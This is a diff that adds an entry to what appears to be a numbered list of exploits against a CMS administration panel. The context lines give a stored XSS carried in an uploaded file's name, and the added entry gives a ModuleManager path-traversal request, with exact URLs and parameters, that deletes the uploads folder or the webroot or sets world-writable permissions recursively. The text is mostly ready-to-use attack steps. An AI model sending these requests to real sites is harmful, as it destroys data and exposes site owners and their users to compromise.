@@ -99,3 +99,8 @@
 - Set: upload a file named `<img src=x onerror=alert(document.cookie)>.txt` via `POST .../moduleinterface.php?mact=FileManager,m1_,upload,0&__c=KEY` (or FilePicker `ajax_cmd` upload, no file perm)
 - Fire: open `https://TARGET/admin/moduleinterface.php?mact=FileManager,m1_,defaultadmin,0&__c=KEY`
 - Req: ability to upload; fires for any admin who browses that folder.
+
+**21. ModuleManager — path traversal (arbitrary delete / chmod)**
+- URL: `POST https://TARGET/admin/moduleinterface.php?mact=ModuleManager,m1_,local_remove,0&__c=KEY`
+- Data: `m1_mod=../uploads` (deletes uploads) · `m1_mod=..` (deletes webroot) · use `local_chmod` + `m1_mod=../..` to chmod -R 0777
+- Req: "Modify Modules" perm.
